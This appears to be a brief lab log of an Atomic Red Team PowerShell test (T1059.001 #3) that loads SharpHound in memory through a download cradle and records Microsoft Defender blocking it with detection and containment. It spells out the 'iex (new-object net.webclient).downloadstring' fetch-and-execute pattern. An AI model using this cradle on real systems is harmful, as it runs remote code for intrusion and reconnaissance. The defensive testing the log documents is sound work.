# t1059.001 – powershell
## atomic test #3 – run bloodhound from memory using download cradle

## objective
simulate adversary use of a powershell in-memory download cradle.

## command executed
```powershell
invoke-atomictest t1059.001 -testnumbers 3
```
expected behaviour
iex (new-object net.webclient).downloadstring(...)

sharphound downloaded from github

script executed in memory

network + process telemetry generated

actual outcome
execution blocked by microsoft defender

trojan:powershell/sacepos.c detected

automatic attack disruption triggered

user containment enforced

ntlm network logon blocked

bastion access denied

device was not isolated.
